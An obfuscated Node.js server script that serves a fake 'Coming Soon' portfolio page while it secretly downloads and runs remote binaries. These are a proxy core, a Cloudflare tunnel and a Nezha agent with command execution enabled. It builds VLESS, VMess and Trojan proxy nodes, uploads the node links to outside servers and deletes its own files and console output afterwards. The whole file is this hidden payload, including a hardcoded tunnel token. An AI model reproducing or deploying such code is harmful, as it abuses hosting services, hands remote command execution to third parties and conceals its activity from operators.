'use strict';const _0x5a07a3=_0x2f9e;(function(_0x24fb7f,_0x3330ba){const _0xbddd91=_0x2f9e,_0x3865df=_0x24fb7f();while(!![]){try{const _0x2586e6=-parseInt(_0xbddd91(0x1e4))/0x1+parseInt(_0xbddd91(0x1f5))/0x2*(-parseInt(_0xbddd91(0x1d6))/0x3)+-parseInt(_0xbddd91(0x21f))/0x4*(-parseInt(_0xbddd91(0x192))/0x5)+parseInt(_0xbddd91(0x1a2))/0x6*(parseInt(_0xbddd91(0x1f6))/0x7)+-parseInt(_0xbddd91(0x209))/0x8+-parseInt(_0xbddd91(0x1c9))/0x9+parseInt(_0xbddd91(0x199))/0xa;if(_0x2586e6===_0x3330ba)break;else _0x3865df['push'](_0x3865df['shift']());}catch(_0x341cc3){_0x3865df['push'](_0x3865df['shift']());}}}(_0x1ea9,0x412a5));const express=require('express'),app=express(),axios=require(_0x5a07a3(0x19e)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x5a07a3(0x22a)),exec=promisify(require(_0x5a07a3(0x22e))[_0x5a07a3(0x1fb)]),{execSync}=require(_0x5a07a3(0x22e)),UPLOAD_URL=process['env'][_0x5a07a3(0x1eb)]||'',PROJECT_URL=process[_0x5a07a3(0x1b4)][_0x5a07a3(0x221)]||'',AUTO_ACCESS=process[_0x5a07a3(0x1b4)][_0x5a07a3(0x1f0)]||![],FILE_PATH=process[_0x5a07a3(0x1b4)][_0x5a07a3(0x215)]||_0x5a07a3(0x231),SUB_PATH=process[_0x5a07a3(0x1b4)][_0x5a07a3(0x1ca)]||_0x5a07a3(0x228),PORT=process[_0x5a07a3(0x1b4)][_0x5a07a3(0x193)]||process[_0x5a07a3(0x1b4)][_0x5a07a3(0x19b)]||0xbb8,UUID=process[_0x5a07a3(0x1b4)][_0x5a07a3(0x21b)]||_0x5a07a3(0x1f8),NEZHA_SERVER=process['env'][_0x5a07a3(0x1c4)]||'',NEZHA_PORT=process[_0x5a07a3(0x1b4)][_0x5a07a3(0x214)]||'',NEZHA_KEY=process[_0x5a07a3(0x1b4)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x5a07a3(0x1b4)][_0x5a07a3(0x1b1)]||_0x5a07a3(0x1a0),ARGO_AUTH=process['env'][_0x5a07a3(0x234)]||_0x5a07a3(0x21c),ARGO_PORT=process[_0x5a07a3(0x1b4)][_0x5a07a3(0x18f)]||0x1f41,CFIP=process[_0x5a07a3(0x1b4)][_0x5a07a3(0x1e2)]||'bk.0407123.xyz',CFPORT=process['env'][_0x5a07a3(0x1b5)]||0x1bb,NAME=process[_0x5a07a3(0x1b4)][_0x5a07a3(0x19d)]||'';!fs[_0x5a07a3(0x1ba)](FILE_PATH)&&fs[_0x5a07a3(0x1df)](FILE_PATH);function generateRandomName(){const _0x153f68=_0x5a07a3,_0x3f3e01=_0x153f68(0x225);let _0x289616='';for(let _0x13ce54=0x0;_0x13ce54<0x6;_0x13ce54++){_0x289616+=_0x3f3e01[_0x153f68(0x1c8)](Math[_0x153f68(0x1b6)](Math[_0x153f68(0x1c1)]()*_0x3f3e01[_0x153f68(0x1ee)]));}return _0x289616;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5a07a3(0x1e1)](FILE_PATH,npmName),phpPath=path[_0x5a07a3(0x1e1)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x5a07a3(0x1e1)](FILE_PATH,botName),subPath=path[_0x5a07a3(0x1e1)](FILE_PATH,_0x5a07a3(0x1b2)),listPath=path['join'](FILE_PATH,'list.txt'),bootLogPath=path[_0x5a07a3(0x1e1)](FILE_PATH,_0x5a07a3(0x206)),configPath=path[_0x5a07a3(0x1e1)](FILE_PATH,_0x5a07a3(0x1a3));app[_0x5a07a3(0x1a9)]('/',function(_0x2659f3,_0x276ed3){const _0x55d1fa='\x0a\x20\x20<!DOCTYPE\x20html>\x0a\x20\x20<html\x20lang=\x22en\x22>\x0a\x20\x20<head>\x0a\x20\x20\x20\x20\x20\x20<meta\x20charset=\x22UTF-8\x22>\x0a\x20\x20\x20\x20\x20\x20<meta\x20name=\x22viewport\x22\x20content=\x22width=device-width,\x20initial-scale=1.0\x22>\x0a\x20\x20\x20\x20\x20\x20<title>Welcome\x20to\x20My\x20Portfolio</title>\x0a\x20\x20\x20\x20\x20\x20<style>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@import\x20url(\x27https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap\x27);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20body\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20\x27Montserrat\x27,\x20sans-serif;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#f4f4f9;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#333;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x200;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20flex;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify-content:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20align-items:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x20100vh;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.container\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x20600px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2040px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#fff;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2010px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x204px\x2020px\x20rgba(0,0,0,0.1);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x202.5em;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20700;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#2c3e50;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2020px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x201.1em;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x201.6;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#555;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin-bottom:\x2030px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20.loader\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\x205px\x20solid\x20#f3f3f3;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-top:\x205px\x20solid\x20#3498db;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2050%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x2050px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20height:\x2050px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20animation:\x20spin\x202s\x20linear\x20infinite;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20@keyframes\x20spin\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x200%\x20{\x20transform:\x20rotate(0deg);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20100%\x20{\x20transform:\x20rotate(360deg);\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20</style>\x0a\x20\x20</head>\x0a\x20\x20<body>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22container\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<h1>Coming\x20Soon</h1>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<p>My\x20new\x20portfolio\x20is\x20under\x20construction.\x20I\x27m\x20working\x20hard\x20to\x20bring\x20you\x20something\x20amazing.\x20Please\x20check\x20back\x20later!</p>\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22loader\x22></div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20</body>\x0a\x20\x20</html>\x0a\x20\x20';_0x276ed3['send'](_0x55d1fa);});function deleteNodes(){const _0x78471c=_0x5a07a3;try{if(!UPLOAD_URL||!fs['existsSync'](subPath))return;const _0x27b89b=fs[_0x78471c(0x1b9)](subPath,'utf-8'),_0x36c490=Buffer[_0x78471c(0x204)](_0x27b89b,_0x78471c(0x202))[_0x78471c(0x207)]('utf-8'),_0x11b98c=_0x36c490['split']('\x0a')[_0x78471c(0x1fc)](_0x305718=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x305718));_0x11b98c[_0x78471c(0x1ee)]>0x0&&axios['post'](UPLOAD_URL+_0x78471c(0x1f2),JSON[_0x78471c(0x20d)]({'nodes':_0x11b98c}),{'headers':{'Content-Type':_0x78471c(0x191)}})[_0x78471c(0x1c2)](()=>{});}catch(_0x513ad1){}}function cleanupOldFiles(){try{const _0x5650a5=fs['readdirSync'](FILE_PATH);_0x5650a5['forEach'](_0x1074ea=>{const _0x1d29c8=_0x2f9e;try{fs['unlinkSync'](path[_0x1d29c8(0x1e1)](FILE_PATH,_0x1074ea));}catch(_0x59bf0c){}});}catch(_0x518255){}}async function generateConfig(){const _0x5aa9c6=_0x5a07a3,_0x554fbe={'log':{'access':_0x5aa9c6(0x1da),'error':_0x5aa9c6(0x1da),'loglevel':_0x5aa9c6(0x1fa)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5aa9c6(0x219),'settings':{'clients':[{'id':UUID,'flow':_0x5aa9c6(0x190)}],'decryption':_0x5aa9c6(0x1fa),'fallbacks':[{'dest':0xbb9,'xver':0x1},{'path':_0x5aa9c6(0x20f),'dest':0xbba},{'path':_0x5aa9c6(0x1b3),'dest':0xbbb},{'path':_0x5aa9c6(0x1b0),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x5aa9c6(0x211),'protocol':_0x5aa9c6(0x219),'settings':{'clients':[{'id':UUID}],'decryption':_0x5aa9c6(0x1fa)},'streamSettings':{'network':_0x5aa9c6(0x230),'security':'none'}},{'port':0xbba,'listen':_0x5aa9c6(0x211),'protocol':_0x5aa9c6(0x219),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5aa9c6(0x1fa)},'streamSettings':{'network':'ws','security':_0x5aa9c6(0x1fa),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5aa9c6(0x1ed),_0x5aa9c6(0x21e)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5aa9c6(0x211),'protocol':_0x5aa9c6(0x1ac),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5aa9c6(0x1ed),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5aa9c6(0x211),'protocol':_0x5aa9c6(0x229),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5aa9c6(0x1fa),'wsSettings':{'path':_0x5aa9c6(0x1b0)}},'sniffing':{'enabled':!![],'destOverride':[_0x5aa9c6(0x1d3),_0x5aa9c6(0x1ed),_0x5aa9c6(0x21e)],'metadataOnly':![]}}],'dns':{'servers':[_0x5aa9c6(0x20c)]},'outbounds':[{'protocol':'freedom','tag':_0x5aa9c6(0x210)},{'protocol':'blackhole','tag':_0x5aa9c6(0x20a)}]};fs[_0x5aa9c6(0x1bb)](path[_0x5aa9c6(0x1e1)](FILE_PATH,_0x5aa9c6(0x1a3)),JSON[_0x5aa9c6(0x20d)](_0x554fbe,null,0x2));}function getSystemArchitecture(){const _0x19dc32=_0x5a07a3,_0x2c53ed=os[_0x19dc32(0x1de)]();return _0x2c53ed['includes']('arm')||_0x2c53ed[_0x19dc32(0x1d1)](_0x19dc32(0x22d))?'arm':_0x19dc32(0x1c6);}function downloadFile(_0x2832b1,_0xfc416,_0x30a0dc){const _0x21b819=_0x5a07a3,_0xf154a2=fs[_0x21b819(0x1e6)](_0x2832b1);axios({'method':_0x21b819(0x1a9),'url':_0xfc416,'responseType':_0x21b819(0x1bc)})[_0x21b819(0x19a)](_0x52c731=>{const _0x2f9d06=_0x21b819;_0x52c731[_0x2f9d06(0x1fe)][_0x2f9d06(0x220)](_0xf154a2),_0xf154a2['on'](_0x2f9d06(0x1e3),()=>{const _0x3d79c5=_0x2f9d06;_0xf154a2[_0x3d79c5(0x1ef)](),console[_0x3d79c5(0x233)](_0x3d79c5(0x1e0)+path[_0x3d79c5(0x1cb)](_0x2832b1)+'\x20successfully'),_0x30a0dc(null,_0x2832b1);});})[_0x21b819(0x1c2)](_0x313af7=>{const _0x48f2cb=_0x21b819;_0xf154a2[_0x48f2cb(0x1ef)](),fs[_0x48f2cb(0x1e8)](_0x2832b1,()=>{});const _0x3bac8b=_0x48f2cb(0x1e0)+path['basename'](_0x2832b1)+'\x20failed:\x20'+_0x313af7[_0x48f2cb(0x236)];console['error'](_0x3bac8b),_0x30a0dc(_0x3bac8b);});}async function downloadAndRun(){const _0x103fac=_0x5a07a3,_0x1922c6=getSystemArchitecture(),_0x548949=getFilesForArchitecture(_0x1922c6);await Promise[_0x103fac(0x1ad)](_0x548949[_0x103fac(0x1d5)](_0x398992=>new Promise((_0x220e07,_0x3ca2c1)=>{const _0x4c52af=_0x103fac;downloadFile(_0x398992[_0x4c52af(0x238)],_0x398992[_0x4c52af(0x1ea)],_0x3f73eb=>_0x3f73eb?_0x3ca2c1(_0x3f73eb):_0x220e07());})));const _0x7f03af=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];execSync('chmod\x20775\x20'+_0x7f03af[_0x103fac(0x1e1)]('\x20'));if(NEZHA_SERVER&&NEZHA_KEY){let _0x4c2b20;if(!NEZHA_PORT){const _0x28dc0a=NEZHA_SERVER[_0x103fac(0x1a5)](':')[_0x103fac(0x19c)](),_0x5a7b75=[_0x103fac(0x1d9),'8443',_0x103fac(0x1c0),'2087',_0x103fac(0x1a4),_0x103fac(0x194)][_0x103fac(0x1d1)](_0x28dc0a)?_0x103fac(0x20e):_0x103fac(0x1b8),_0x31ec80=_0x103fac(0x208)+NEZHA_KEY+_0x103fac(0x22c)+NEZHA_SERVER+_0x103fac(0x223)+_0x5a7b75+_0x103fac(0x201)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x103fac(0x1f9)),_0x31ec80),_0x4c2b20='nohup\x20'+phpPath+_0x103fac(0x1d7)+FILE_PATH+_0x103fac(0x1cd);}else{const _0x1bc7b8=[_0x103fac(0x1d9),_0x103fac(0x1dc),_0x103fac(0x1c0),_0x103fac(0x1d4),_0x103fac(0x1a4),_0x103fac(0x194)][_0x103fac(0x1d1)](NEZHA_PORT)?'--tls':'';_0x4c2b20=_0x103fac(0x224)+npmPath+_0x103fac(0x1bd)+NEZHA_SERVER+':'+NEZHA_PORT+_0x103fac(0x1a6)+NEZHA_KEY+'\x20'+_0x1bc7b8+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}try{await exec(_0x4c2b20),console[_0x103fac(0x233)](_0x103fac(0x203));}catch(_0x2f2940){console[_0x103fac(0x1ab)](_0x103fac(0x213)+_0x2f2940);}}try{await exec(_0x103fac(0x224)+webPath+_0x103fac(0x1db)+FILE_PATH+_0x103fac(0x22f)),console['log']('Web\x20core\x20is\x20running');}catch(_0x15fb75){console[_0x103fac(0x1ab)](_0x103fac(0x226)+_0x15fb75);}let _0x533afe;if(ARGO_AUTH[_0x103fac(0x227)](/^[A-Z0-9a-z=]{120,250}$/))_0x533afe=_0x103fac(0x232)+ARGO_AUTH;else{if(ARGO_AUTH[_0x103fac(0x227)](/TunnelSecret/)){fs[_0x103fac(0x1bb)](path[_0x103fac(0x1e1)](FILE_PATH,_0x103fac(0x20b)),ARGO_AUTH);const _0x233e43=ARGO_AUTH[_0x103fac(0x1a5)]('\x22')[0xb],_0x4337a0=_0x103fac(0x222)+_0x233e43+_0x103fac(0x1a8)+path[_0x103fac(0x1e1)](FILE_PATH,_0x103fac(0x20b))+'\x0aprotocol:\x20http2\x0aingress:\x0a\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x103fac(0x1c3)+ARGO_PORT+_0x103fac(0x196);fs['writeFileSync'](path[_0x103fac(0x1e1)](FILE_PATH,_0x103fac(0x205)),_0x4337a0),_0x533afe=_0x103fac(0x1ce)+FILE_PATH+_0x103fac(0x1af);}else _0x533afe=_0x103fac(0x1ae)+bootLogPath+_0x103fac(0x19f)+ARGO_PORT;}try{await exec(_0x103fac(0x224)+botPath+'\x20'+_0x533afe+'\x20>/dev/null\x202>&1\x20&'),console[_0x103fac(0x233)](_0x103fac(0x1e5));}catch(_0x40d98c){console[_0x103fac(0x1ab)]('Argo\x20running\x20error:\x20'+_0x40d98c);}}function getFilesForArchitecture(_0x4e1538){const _0x5ce5bb=_0x5a07a3;let _0x41073f=[{'fileName':webPath,'fileUrl':_0x5ce5bb(0x1f3)+(_0x4e1538===_0x5ce5bb(0x1c7)?'arm64':_0x5ce5bb(0x1ff))+_0x5ce5bb(0x1a7)},{'fileName':botPath,'fileUrl':'https://'+(_0x4e1538===_0x5ce5bb(0x1c7)?_0x5ce5bb(0x1f1):'amd64')+'.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){const _0x450c58=NEZHA_PORT?_0x5ce5bb(0x1bf):'v1',_0x39a6e5=NEZHA_PORT?npmPath:phpPath;_0x41073f['push']({'fileName':_0x39a6e5,'fileUrl':'https://'+(_0x4e1538==='arm'?_0x5ce5bb(0x1f1):'amd64')+_0x5ce5bb(0x198)+_0x450c58});}return _0x41073f;}function _0x1ea9(){const _0x24e49f=['4482171mWXAok','SUB_PATH','basename','vmess://','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','firefox','App\x20is\x20running.\x20Setup\x20complete.','includes','&path=%2Fvless-argo%3Fed%3D2560#','http','2087','map','69mVgLlx','\x20-c\x20\x22','/api/add-subscriptions','443','/dev/null','\x20-c\x20','8443','\x20>/dev/null\x202>&1','arch','mkdirSync','Download\x20','join','CFIP','finish','364385fMgxLc','Argo\x20tunnel\x20is\x20running','createWriteStream','Subscription\x20uploaded\x20successfully','unlink','Failed\x20to\x20add\x20keep-alive\x20task:','fileUrl','UPLOAD_URL','subscription','tls','length','close','AUTO_ACCESS','arm64','/api/delete-nodes','https://','HTTP\x20server\x20is\x20running\x20on\x20port:\x20','16578WPWGRh','1136919fcuamm','utf-8','dade9724-96d2-461e-9846-61bf68b9d401','config.yaml','none','exec','filter','&path=%2Ftrojan-argo%3Fed%3D2560#','data','amd64','&fp=firefox&type=ws&host=','\x0auuid:\x20','base64','Nezha\x20agent\x20is\x20running','from','tunnel.yml','boot.log','toString','\x0aclient_secret:\x20','1481352fnWxOB','block','tunnel.json','https+local://8.8.8.8/dns-query','stringify','true','/vless-argo','direct','127.0.0.1','?security=tls&sni=','Nezha\x20running\x20error:\x20','NEZHA_PORT','FILE_PATH','nodes','Could\x20not\x20find\x20Argo\x20domain\x20in\x20log,\x20using\x20default\x20or\x20env.','Error\x20reading\x20log\x20file,\x20using\x20default\x20or\x20env\x20domain.','vless','clear','UUID','eyJhIjoiOGNhOTliOWUyNjc1YmMxMzRlMGM1YjA4NWQzYTk0MzkiLCJ0IjoiMzdhYTM4MDctMWM1NC00OGZmLTgwYzAtM2NhMjY0YWYzYzZlIiwicyI6IllXWmpZams1WXpVdFpURXdZaTAwWVdRNUxUbGlaamd0TnpnMll6RXlOalV3WkRRMSJ9','\x20>\x20nul\x202>&1','quic','136028zqgJei','pipe','PROJECT_URL','\x0atunnel:\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atls:\x20','nohup\x20','abcdefghijklmnopqrstuvwxyz','Web\x20running\x20error:\x20','match','qianxiuadmin','trojan','util','https://oooo.serv00.net/add-url','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0ainsecure_tls:\x20true\x0areport_delay:\x204\x0aserver:\x20','aarch64','child_process','/config.json\x20>/dev/null\x202>&1\x20&','tcp','./tmp','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','log','ARGO_AUTH','text/plain;\x20charset=utf-8','message','/vmess-argo?ed=2560','fileName','ARGO_PORT','xtls-rprx-vision','application/json','40oFsVyp','SERVER_PORT','2053','response','\x0a\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20-\x20service:\x20http_status:404','---------------------------------','.ssss.nyc.mn/','7458300wawClJ','then','PORT','pop','NAME','axios','\x20--loglevel\x20info\x20--url\x20http://localhost:','railway.d.4.8.b.0.d.0.0.1.0.a.2.ip6.arpa','/api/add-nodes','18SVdITU','config.json','2083','split','\x20-p\x20','.ssss.nyc.mn/web','\x0acredentials-file:\x20','get','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','error','vmess','all','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/tunnel.yml\x20run','/trojan-argo','ARGO_DOMAIN','sub.txt','/vmess-argo','env','CFPORT','floor','status','false','readFileSync','existsSync','writeFileSync','stream','\x20-s\x20','post','agent','2096','random','catch','\x0a\x20\x20\x20\x20service:\x20http://localhost:','NEZHA_SERVER','-----\x20Subscription\x20(Base64)\x20-----','amd','arm','charAt'];_0x1ea9=function(){return _0x24e49f;};return _0x1ea9();}async function extractDomainAndGenerateLinks(){const _0x4995c2=_0x5a07a3;await new Promise(_0x5345de=>setTimeout(_0x5345de,0x1388));let _0x11b745=ARGO_DOMAIN;if(!ARGO_AUTH[_0x4995c2(0x227)](/^[A-Z0-9a-z=]{120,250}$/)&&!ARGO_AUTH[_0x4995c2(0x227)](/TunnelSecret/))try{const _0x457293=fs['readFileSync'](bootLogPath,_0x4995c2(0x1f7)),_0x471451=_0x457293[_0x4995c2(0x227)](/https?:\/\/([^ ]*trycloudflare\.com)/);_0x471451?_0x11b745=_0x471451[0x1]:console[_0x4995c2(0x233)](_0x4995c2(0x217));}catch(_0x159c1e){console['log'](_0x4995c2(0x218));}console[_0x4995c2(0x233)]('Using\x20domain:',_0x11b745);const _0x320a3f=execSync(_0x4995c2(0x1aa),{'encoding':_0x4995c2(0x1f7)})['trim'](),_0x13fa9b=NAME?NAME+'-'+_0x320a3f:_0x320a3f,_0x47ba58={'v':'2','ps':_0x13fa9b,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4995c2(0x1fa),'net':'ws','type':_0x4995c2(0x1fa),'host':_0x11b745,'path':_0x4995c2(0x237),'tls':_0x4995c2(0x1ed),'sni':_0x11b745,'alpn':'','fp':_0x4995c2(0x1cf)},_0x434ac5=['vless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x11b745+'&fp=firefox&type=ws&host='+_0x11b745+_0x4995c2(0x1d2)+_0x13fa9b,_0x4995c2(0x1cc)+Buffer[_0x4995c2(0x204)](JSON[_0x4995c2(0x20d)](_0x47ba58))[_0x4995c2(0x207)]('base64'),'trojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x4995c2(0x212)+_0x11b745+_0x4995c2(0x200)+_0x11b745+_0x4995c2(0x1fd)+_0x13fa9b][_0x4995c2(0x1e1)]('\x0a\x0a'),_0x149db4=Buffer[_0x4995c2(0x204)](_0x434ac5)[_0x4995c2(0x207)](_0x4995c2(0x202));console[_0x4995c2(0x233)](_0x4995c2(0x1c5)),console[_0x4995c2(0x233)](_0x149db4),console[_0x4995c2(0x233)](_0x4995c2(0x197)),fs[_0x4995c2(0x1bb)](subPath,_0x149db4),app[_0x4995c2(0x1a9)]('/'+SUB_PATH,(_0x571063,_0x5f4c2b)=>{const _0x41910d=_0x4995c2;_0x5f4c2b['type'](_0x41910d(0x235))['send'](_0x149db4);}),await uploadSubscription(_0x434ac5);}async function uploadSubscription(_0x156295){const _0x5e90f3=_0x5a07a3;if(!UPLOAD_URL)return;const _0x1baaf7={};if(PROJECT_URL){_0x1baaf7[_0x5e90f3(0x1ec)]=[PROJECT_URL+'/'+SUB_PATH];try{await axios[_0x5e90f3(0x1be)](UPLOAD_URL+_0x5e90f3(0x1d8),_0x1baaf7,{'headers':{'Content-Type':_0x5e90f3(0x191)}}),console['log'](_0x5e90f3(0x1e7));}catch(_0x506f4f){_0x506f4f[_0x5e90f3(0x195)]&&_0x506f4f[_0x5e90f3(0x195)][_0x5e90f3(0x1b7)]!==0x190&&console[_0x5e90f3(0x1ab)]('Failed\x20to\x20upload\x20subscription:',_0x506f4f[_0x5e90f3(0x236)]);}}else{_0x1baaf7[_0x5e90f3(0x216)]=_0x156295[_0x5e90f3(0x1a5)]('\x0a\x0a')[_0x5e90f3(0x1fc)](Boolean);try{await axios[_0x5e90f3(0x1be)](UPLOAD_URL+_0x5e90f3(0x1a1),_0x1baaf7,{'headers':{'Content-Type':_0x5e90f3(0x191)}}),console[_0x5e90f3(0x233)]('Nodes\x20uploaded\x20successfully');}catch(_0x39c6c7){console[_0x5e90f3(0x1ab)]('Failed\x20to\x20upload\x20nodes:',_0x39c6c7['message']);}}}async function keepAlive(){const _0x1a3c04=_0x5a07a3;if(AUTO_ACCESS&&PROJECT_URL)try{await axios['post'](_0x1a3c04(0x22b),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1a3c04(0x191)}}),console[_0x1a3c04(0x233)]('Keep-alive\x20task\x20added\x20successfully');}catch(_0x27cab9){console[_0x1a3c04(0x1ab)](_0x1a3c04(0x1e9),_0x27cab9[_0x1a3c04(0x236)]);}}function _0x2f9e(_0xf2b20a,_0x5b8369){const _0x1ea989=_0x1ea9();return _0x2f9e=function(_0x2f9e58,_0x485d0d){_0x2f9e58=_0x2f9e58-0x18f;let _0x184a43=_0x1ea989[_0x2f9e58];return _0x184a43;},_0x2f9e(_0xf2b20a,_0x5b8369);}function cleanUpLater(){setTimeout(()=>{const _0x500f6c=_0x2f9e,_0x1c8128=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath,path[_0x500f6c(0x1e1)](FILE_PATH,'tunnel.json'),path['join'](FILE_PATH,'tunnel.yml'),path['join'](FILE_PATH,'config.yaml')],_0x2fbe40=process['platform']==='win32'?'del\x20/f\x20/q\x20'+_0x1c8128['filter'](fs[_0x500f6c(0x1ba)])[_0x500f6c(0x1e1)]('\x20')+_0x500f6c(0x21d):'rm\x20-f\x20'+_0x1c8128[_0x500f6c(0x1fc)](fs[_0x500f6c(0x1ba)])[_0x500f6c(0x1e1)]('\x20')+_0x500f6c(0x1dd);exec(_0x2fbe40,()=>{const _0x581f0b=_0x500f6c;console[_0x581f0b(0x21a)](),console[_0x581f0b(0x233)](_0x581f0b(0x1d0));});},0x15f90);}async function main(){const _0x3ca282=_0x5a07a3;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadAndRun(),await extractDomainAndGenerateLinks(),await keepAlive(),cleanUpLater();}catch(_0x5c1200){console[_0x3ca282(0x1ab)]('An\x20error\x20occurred\x20during\x20startup:',_0x5c1200);}}main(),app['listen'](PORT,()=>console['log'](_0x5a07a3(0x1f4)+PORT+'!'));
